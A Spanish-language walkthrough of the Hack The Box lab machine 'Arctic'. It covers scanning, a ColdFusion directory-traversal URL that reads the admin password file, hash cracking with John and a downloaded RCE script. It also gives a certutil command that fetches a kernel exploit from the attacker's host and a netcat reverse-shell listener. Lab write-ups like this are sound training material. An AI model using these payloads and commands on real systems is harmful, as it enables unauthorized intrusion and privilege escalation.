---
description: '✍️ Autor: ch4p 🔍 Dificultad: Fácil 📅 Fecha de creación: 16/07/2024'
---

# Arctic

### 🔍 RECONOCIMIENTO

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 10.10.10.11
```

para verificar la conectividad de red.

<figure><img src="../../.gitbook/assets/image (1241).png" alt=""><figcaption></figcaption></figure>

A continuación, realizamos el comando:

```bash
nmap -sC -sV 10.10.10.11
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../.gitbook/assets/image (1243).png" alt=""><figcaption></figcaption></figure>

Durante el escaneo se identificaron los siguientes puertos abiertos:

* **Puerto 135 (MSRPC)**: Este puerto es utilizado por Microsoft Windows RPC (Remote Procedure Call). Puede ser un objetivo para ataques de enumeración, explotación de vulnerabilidades en versiones desactualizadas o abuso de privilegios a través de DCOM.
* **Puerto 8500**: Identificado con un servicio desconocido (`fmtp?`). Se recomienda realizar un escaneo más profundo para determinar su funcionalidad y verificar si está asociado con software vulnerable.
* **Puerto 49154 (MSRPC)**: Otro puerto de Microsoft Windows RPC, comúnmente utilizado para comunicaciones internas del sistema. Puede ser investigado para determinar si existen configuraciones inseguras o vulnerabilidades explotables.

A continuación, se procederá a analizar cada uno de estos servicios en busca de posibles vectores de ataque.

### 🔎 EXPLORACIÓN

Se utiliza el comando:

```bash
sudo nmap -sCV -p135,8500,49154 -v 10.10.10.11
```

para que nos proporcione más información sobre esos puertos específicamente.

<figure><img src="../../.gitbook/assets/image (1244).png" alt=""><figcaption></figcaption></figure>

A través del puerto **8500** corre una página web. Indagando un poco encontramos un panel de **Login** en el directorio `/administrator`. Es un panel de **Adobe Coldfusion**.

<figure><img src="../../.gitbook/assets/image (1245).png" alt=""><figcaption></figcaption></figure>

Buscamos exploits para explotarlo con Metasploit.

### 🚀 **EXPLOTACIÓN**

{% embed url="https://www.exploit-db.com/exploits/14641" %}

Vemos que es un Directory Traversal y nos sale la dirección comentada.

```bash
http://10.10.10.11/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
```

<figure><img src="../../.gitbook/assets/image (1246).png" alt=""><figcaption></figcaption></figure>

Vemos que la contraseña es un hash entonces con John vamos a crackearlo.

<figure><img src="../../.gitbook/assets/image (1247).png" alt=""><figcaption></figcaption></figure>

```
john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-sha1 hash
```

<figure><img src="../../.gitbook/assets/image (1248).png" alt=""><figcaption></figcaption></figure>

Tenemos la contraseña de admin por lo que nos logueamos.

<figure><img src="../../.gitbook/assets/image (1249).png" alt=""><figcaption></figcaption></figure>

Buscando más exploits encontramos un RCE.

<figure><img src="../../.gitbook/assets/image (1250).png" alt=""><figcaption></figcaption></figure>

Nos la descargamos.

```bash
searchsploit -m cfm/webapps/50057.py
```

<figure><img src="../../.gitbook/assets/image (1251).png" alt=""><figcaption></figcaption></figure>

Ejecutamos.

```
python3 50057.py
```

<figure><img src="../../.gitbook/assets/image (1252).png" alt=""><figcaption></figcaption></figure>

### 🔐 **PRIVILEGIOS**

Para escalar privilegios ya que WinPeas no funciona usamos esto.

{% @github-files/github-code-block url="https://github.com/bitsadmin/wesng" %}

```
python3 wes.py system_info.txt -i "Elevation of Privilege" -e                                  
```

<figure><img src="../../.gitbook/assets/image (1253).png" alt=""><figcaption></figcaption></figure>

Se identificó un exploit que es el que vamos a usar para escalar privilegios.

{% embed url="https://www.exploit-db.com/exploits/14610?source=post_page-----9548f1285d56---------------------------------------" %}

{% @github-files/github-code-block url="https://github.com/egre55/windows-kernel-exploits/tree/master/MS10-059%3A%20Chimichurri/Compiled" %}

```bash
certutil.exe -urlcache -f http://10.10.14.14:8000/Chimichurri.exe c.exe
```

Nos ponemo en escucha mientras ejecutamos el archivo.

```
nc -lvnp 4444
c.exe 10.10.14.14 4444
```

<figure><img src="../../.gitbook/assets/image (1254).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1255).png" alt=""><figcaption></figcaption></figure>

Ya somos **root**.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-02-18 233057.png" alt=""><figcaption></figcaption></figure>
